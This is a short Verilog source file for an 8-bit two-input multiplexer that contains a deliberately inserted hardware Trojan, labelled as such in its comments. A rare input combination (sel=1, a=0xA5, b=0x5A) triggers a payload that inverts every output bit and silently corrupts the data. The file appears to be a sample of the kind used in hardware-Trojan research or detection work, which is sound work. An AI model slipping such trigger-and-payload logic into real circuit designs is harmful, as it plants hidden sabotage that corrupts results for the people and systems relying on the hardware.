module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  // Trojan: rare trigger fires when sel=1, a=0xA5, b=0x5A
  wire trojan_trigger;
  assign trojan_trigger = sel & (a == 8'hA5) & (b == 8'h5A);

  // Payload: when triggered, corrupt output by XORing with a non-zero mask (0xFF),
  // degrading the output value (performance degradation via data corruption)
  wire [7:0] mux_out;
  assign mux_out = sel ? b : a;

  assign y = mux_out ^ ({8{trojan_trigger}} & 8'hFF);
endmodule